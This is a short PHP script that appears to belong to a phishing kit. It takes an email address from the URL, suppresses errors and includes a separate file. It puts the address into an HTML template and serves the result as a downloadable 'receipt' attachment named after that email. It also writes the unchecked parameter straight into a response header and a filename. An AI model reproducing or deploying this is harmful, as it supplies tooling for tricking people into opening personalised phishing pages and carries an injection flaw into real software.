<?php
error_reporting(0);
include "red.php";
$email=$_GET['e'];
$file = file_get_contents("in.txt"); 
//////////////////////////////////////////////////

$filename = 'receipt-'.$email.'.htm';

//////////////////////////////////////////////////
if (!empty($email)){$file = str_replace("%EMAIL%", $email, $file);}else{exit;}
header("Content-Type: text/html");
header('Content-Disposition: attachment; filename="'.$filename.'"');
header("Content-Length: " . strlen($file));
echo $file;
exit;